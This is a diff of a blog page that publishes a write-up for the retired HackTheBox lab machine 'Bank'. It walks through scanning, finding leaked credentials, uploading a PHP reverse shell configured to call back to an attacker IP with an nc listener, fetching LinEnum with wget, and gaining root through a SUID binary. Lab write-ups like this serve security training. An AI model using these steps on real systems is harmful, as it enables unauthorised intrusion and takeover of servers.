@@ -94,6 +94,10 @@
           
             
           
+            
+          
+            
+          
         </ul>
 
       </div>
@@ -122,8 +126,6 @@
 
     <div class="post__content" data-aos="fade-up" data-aos-easing="ease-out-quad" data-aos-delay="100" data-aos-duration="700">
       <p>Write-up for retired machine “Bank” on <a href="https://hackthebox.eu" target="_blank">hackthebox.eu</a>. Its a machine running Linux with IP adress: <strong>10.10.10.29</strong>. Lets start by running a NMAP scan and see what ports are open.</p>
-
-<h2 id="nmap-scan"><strong>NMAP Scan</strong></h2>
 
 <p><a href="https://www.explainshell.com/explain?cmd=nmap+-T4+-A+-p-+-v+10.10.10.29" target="_blank">nmap -T4 -A -p- -v 10.10.10.29</a></p>
 
@@ -206,8 +208,6 @@ PORT   STATE SERVICE VERSION
 
 <p><img src="/assets/img/banklogin.png" alt="bank.htb login page" /></p>
 
-<h2 id="dirsearch"><strong>Dirsearch</strong></h2>
-
 <p>Lets run <a href="https://github.com/maurosoria/dirsearch" target="_blank">dirsearch</a> to see if we can find more directories. 
 I used dirbusters medium wordlist for this search.</p>
 
@@ -237,13 +237,13 @@ Task Completed                                   </code></pre></figure>
 
 <p>http://bank.htb/balance-transfer show a number of records with encrypted credentials.</p>
 
-<p><img src="https://blckbrdsec.com/assets/img/balance.png" alt="balance-transfer" /></p>
+<p><img src="/assets/img/balance.png" alt="balance-transfer" /></p>
 
 <p>Among all the records we see a significant smaller file compared to the rest.</p>
 
-<p><img src="https://blckbrdsec.com/assets/img/smallfile.png" alt="balance-transfer" /></p>
+<p><img src="/assets/img/smallfile.png" alt="balance-transfer" /></p>
 
-<p>Opening 68576f20e9732f1b2edc4df5b8533230.acc we see –ERR ENCRYPT FAILED and usable credentials.</p>
+<p>Opening 68576f20e9732f1b2edc4df5b8533230.acc we see –ERR ENCRYPT FAILED and usable credentials which we will use t login.</p>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nt">--ERR</span> ENCRYPT FAILED
 +<span class="o">=================</span>+
@@ -259,13 +259,61 @@ Transactions: 39
 Balance: 8842803 <span class="nb">.</span>
 <span class="o">===</span><span class="nv">UserAccount</span><span class="o">===</span></code></pre></figure>
 
+<p><img src="/assets/img/support.png" alt="support" /></p>
+
+<p>On the support page we can upload a malicious php file. I used the php reverse shell by <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank">pentestmonkey</a></p>
+
+<p>Change the ip, port and rename the malicious php file extension to .htb</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'10.10.10.1'</span><span class="p">;</span>  // CHANGE THIS
+<span class="nv">$port</span> <span class="o">=</span> 1234<span class="p">;</span>       // CHANGE THIS</code></pre></figure>
+
+<p>Start a  <strong>nc -nvlp 1234</strong> listener for the reverse shell and now upload the .htb file.</p>
+
+<p><img src="/assets/img/upload.png" alt="upload" /></p>
+
+<p>Open the attachment in the ticket and voila we got a shell.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Linux bank 4.4.0-79-generic <span class="c">#100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 athlon i686 GNU/Linux</span>
+ 23:42:15 up 12:05,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ </span></code></pre></figure>
+
+<p>Since we’re www-data the user.txt can be located in /home/chris.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /home/chris
+total 4
+<span class="nt">-r--r--r--</span> 1 chris chris 33 May 29  2017 user.txt</code></pre></figure>
+
+<p>To get root we use <a href="https://github.com/rebootuser/LinEnum" target="_blank">LinEnum</a></p>
+
+<p>Use pythons SimpleHTTPServer and wget to get the LinEnum.sh file to the /var/www/bank dir and run it.</p>
+
+<p>The emergency file stands out from the rest.</p>
+
+<ul>
+  <li>-rwsr-xr-x 1 root root 112204 Jun 14  2017 /var/htb/bin/emergency</li>
+</ul>
+
+<p>If we run it i appears that nothing happends.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /var/htb/bin
+<span class="nv">$ </span>./emergency
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span></code></pre></figure>
+
+<p>So now we can cat the root.txt in the root dir and we’re done.</p>
 
     </div>
 
     
     <div class="post-tags">
       
-      <a href="/tag/hackthebox" class="post-tags__tag">hackthebox</a>
+      <a href="/tag/hackthebox," class="post-tags__tag">hackthebox,</a>
+      
+      <a href="/tag/bank" class="post-tags__tag">bank</a>
       
     </div>
     
